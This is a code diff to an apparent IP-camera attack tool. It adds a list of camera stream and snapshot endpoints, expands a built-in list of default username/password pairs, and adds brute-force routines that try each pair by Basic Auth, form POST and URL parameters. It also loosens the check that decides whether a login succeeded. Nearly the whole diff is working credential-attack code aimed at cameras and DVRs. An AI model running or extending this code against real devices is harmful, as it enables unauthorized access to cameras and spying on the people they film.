@@ -466,12 +466,35 @@ class AdvancedCameraDetector:
         print(f"{Fore.YELLOW}╚{'═' * 60}╝{Style.RESET_ALL}")
 
 class LiveStreamDetector:
-    """📹 ENHANCED LIVE STREAM DETECTION & VALIDATION"""
+    """📹 ENHANCED LIVE STREAM VALIDATION & MEDIA DISCOVERY"""
     
     def __init__(self, config):
         self.config = config
-        self.stream_protocols = self._load_stream_protocols()
-        logger.info(f"📹 Stream detector loaded for {len(self.stream_protocols)} protocols")
+        self.stream_protocols = ['RTSP', 'HTTP', 'RTMP', 'MMS', 'HLS']
+        self.media_endpoints = self._get_comprehensive_media_endpoints()
+        logger.info(f"📹 Stream detector loaded for {len(self.stream_protocols)} protocols and {len(self.media_endpoints)} endpoints")
+    
+    def _get_comprehensive_media_endpoints(self) -> List[str]:
+        """📹 Get comprehensive list of media endpoints"""
+        return [
+            # MJPEG Streams
+            '/video.mjpg', '/video.mjpeg', '/mjpg/video.mjpg', '/mjpeg',
+            # Snapshots
+            '/snapshot.jpg', '/snap.jpg', '/live.jpg', '/stream.jpg',
+            '/img.jpg', '/image.jpg', '/picture.jpg', '/capture.jpg',
+            # CGI endpoints
+            '/cgi-bin/video.cgi', '/cgi-bin/snapshot.cgi', '/cgi-bin/image.cgi',
+            '/cgi-bin/mjpg/video.cgi', '/cgi-bin/viewer/video.jpg',
+            # Axis specific
+            '/axis-cgi/mjpg/video.cgi', '/axis-cgi/jpg/image.cgi',
+            # Generic paths
+            '/jpg/image.jpg', '/jpg/1/image.jpg', '/jpg/2/image.jpg',
+            '/media?action=snapshot', '/stream?action=snapshot',
+            '/video?action=stream', '/image?action=stream',
+            # Additional common paths
+            '/videostream.cgi', '/videostream.asf', '/video.asf',
+            '/h264', '/mpeg4', '/stream', '/live', '/cam'
+        ]
     
     def _load_stream_protocols(self) -> Dict[str, Dict]:
         """🎯 Load streaming protocol configurations"""
@@ -624,9 +647,11 @@ class UltimateCredentialTester:
             ('admin', '12345'), ('admin', '123456'), ('admin', ''),
             ('admin', '1111'), ('admin', '9999'), ('admin', '12345678'),
             ('admin', '123456789'), ('admin', '888888'), ('admin', '54321'),
-            ('root', 'admin'), ('root', '1234'), ('supervisor', 'supervisor'),
+            ('root', 'admin'), ('root', '1234'), ('root', 'pass'), ('root', ''),
+            ('supervisor', 'supervisor'), ('operator', 'operator'),
             ('user', 'user'), ('guest', 'guest'), ('default', 'default'),
-            ('admin', 'admin1234'), ('admin', '1234abcd'), ('admin', '4321')
+            ('admin', 'admin1234'), ('admin', '1234abcd'), ('admin', '4321'),
+            ('admin', 'password1'), ('admin', 'admin123'), ('service', 'service')
         ]
         credentials.extend(base_creds)
         
@@ -651,7 +676,7 @@ class UltimateCredentialTester:
         return credentials[:self.config.credential_limit]
     
     def test_credentials(self, target_ip: str, open_ports: List[int], device_info: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """🔐 Perform massive credential testing"""
+        """🔐 Perform massive credential testing with multiple methods"""
         if not self.config.enable_credential_testing:
             return []
         
@@ -666,7 +691,7 @@ class UltimateCredentialTester:
         
         def test_single_credential(url: str, username: str, password: str) -> Optional[Dict[str, Any]]:
             try:
-                # 🎯 Basic authentication test
+                # 🎯 Method 1: Basic authentication
                 auth = requests.auth.HTTPBasicAuth(username, password)
                 response = requests.get(url, auth=auth, timeout=self.config.request_timeout, verify=False)
                 
@@ -676,6 +701,32 @@ class UltimateCredentialTester:
                         'username': username,
                         'password': password,
                         'method': 'Basic Auth',
+                        'device_brand': device_info.get('brand', 'Unknown')
+                    }
+                
+                # 🎯 Method 2: Form-based POST
+                form_data = {'username': username, 'password': password}
+                response = requests.post(url, data=form_data, timeout=self.config.request_timeout, verify=False)
+                
+                if self._is_login_successful(response):
+                    return {
+                        'url': url,
+                        'username': username,
+                        'password': password,
+                        'method': 'Form POST',
+                        'device_brand': device_info.get('brand', 'Unknown')
+                    }
+                
+                # 🎯 Method 3: URL parameters
+                param_url = f"{url}?username={username}&password={password}"
+                response = requests.get(param_url, timeout=self.config.request_timeout, verify=False)
+                
+                if self._is_login_successful(response):
+                    return {
+                        'url': url,
+                        'username': username,
+                        'password': password,
+                        'method': 'URL Params',
                         'device_brand': device_info.get('brand', 'Unknown')
                     }
                 
@@ -733,23 +784,41 @@ class UltimateCredentialTester:
         
         return list(set(urls))
     
-    def _is_login_successful(self, response) -> bool:
-        """✅ Determine login success"""
-        success_indicators = ['logout', 'dashboard', 'main', 'live', 'video', 'settings', 'welcome']
-        failure_indicators = ['incorrect', 'invalid', 'error', 'failed', 'wrong password']
-        
-        response_text = response.text.lower()
-        
-        if any(indicator in response_text for indicator in failure_indicators):
+    def _is_login_successful(self, response: requests.Response) -> bool:
+        """✅ Enhanced login success detection with multiple indicators"""
+        # Check status code
+        if response.status_code not in [200, 301, 302]:
             return False
         
-        if any(indicator in response_text for indicator in success_indicators):
+        content_lower = response.text.lower()
+        
+        # Check for error indicators first (high priority)
+        error_indicators = ['incorrect', 'invalid', 'error', 'failed', 'wrong', 'denied', 'unauthorized']
+        if any(indicator in content_lower for indicator in error_indicators):
+            return False
+        
+        # Check for success indicators (multiple categories)
+        success_indicators = [
+            'logout', 'main', 'dashboard', 'live', 'video', 'settings',
+            'welcome', 'success', 'configuration', 'system', 'admin',
+            'channel', 'playback', 'record', 'alarm', 'network'
+        ]
+        
+        if any(indicator in content_lower for indicator in success_indicators):
             return True
         
-        if response.history and 'login' not in response.url.lower():
+        # Check for redirect (often indicates successful login)
+        if response.history and len(response.history) > 0:
             return True
         
-        if response.cookies:
+        # Check for session cookies (indicates authentication)
+        if response.cookies and len(response.cookies) > 0:
+            cookie_names = [cookie.name.lower() for cookie in response.cookies]
+            if any(name in ['session', 'auth', 'token', 'sid'] for name in cookie_names):
+                return True
+        
+        # Check for substantial content (not just error page)
+        if len(response.text) > 2000:  # Substantial content likely means success
             return True
         
         return False
